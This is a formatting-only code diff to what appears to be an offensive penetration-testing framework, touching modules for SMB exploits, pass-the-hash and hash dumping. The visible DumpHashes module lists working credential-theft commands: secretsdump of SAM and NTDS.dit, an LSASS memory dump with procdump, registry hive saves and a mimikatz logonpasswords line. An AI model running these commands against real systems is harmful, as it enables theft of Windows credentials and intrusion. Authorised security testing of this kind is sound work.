@@ -52,6 +52,7 @@ class SMBGhost(AttackModule):
             ),
         )
 
+
 class EternalBlue(AttackModule):
     name = "EternalBlue"
     description = "SMBv1 MS17-010 RCE (CVE-2017-0144)"
@@ -90,6 +91,7 @@ class EternalBlue(AttackModule):
             privilege_level="system",
         )
 
+
 class SMBRelay(AttackModule):
     name = "SMBRelay"
     description = "SMB relay attack via impacket ntlmrelayx"
@@ -123,6 +125,7 @@ class SMBRelay(AttackModule):
             ),
             prerequisites=["SMB signing disabled on relay target", "relay victim allowlisted"],
         )
+
 
 class SMBNullSession(AttackModule):
     name = "SMBNullSession"
@@ -176,6 +179,7 @@ print(json.dumps(results))
 # Web Exploitation Modules
 # ---------------------------------------------------------------------------
 
+
 class PassTheHash(AttackModule):
     name = "PassTheHash"
     description = "Execute commands via NTLM hash (no plaintext needed) using impacket wmiexec/psexec/smbexec"
@@ -214,6 +218,7 @@ class PassTheHash(AttackModule):
             privilege_level="admin",
         )
 
+
 class DumpHashes(AttackModule):
     name = "DumpHashes"
     description = "SAM/SYSTEM extraction, LSASS memory dump, NTDS.dit extraction for offline cracking"
@@ -249,7 +254,10 @@ class DumpHashes(AttackModule):
                 {"name": "SAM dump", "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"},
                 {"name": "LSASS dump", "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"},
                 {"name": "NTDS.dit", "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"},
-                {"name": "Registry save", "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save"},
+                {
+                    "name": "Registry save",
+                    "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save",
+                },
                 {"name": "Mimikatz", "command": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"},
             ],
             prerequisites=["Administrator/SYSTEM access on target", "Ability to upload/execute tools"],
@@ -259,4 +267,3 @@ class DumpHashes(AttackModule):
 # ---------------------------------------------------------------------------
 # AI-Assisted Exploit Synthesis Modules
 # ---------------------------------------------------------------------------
-
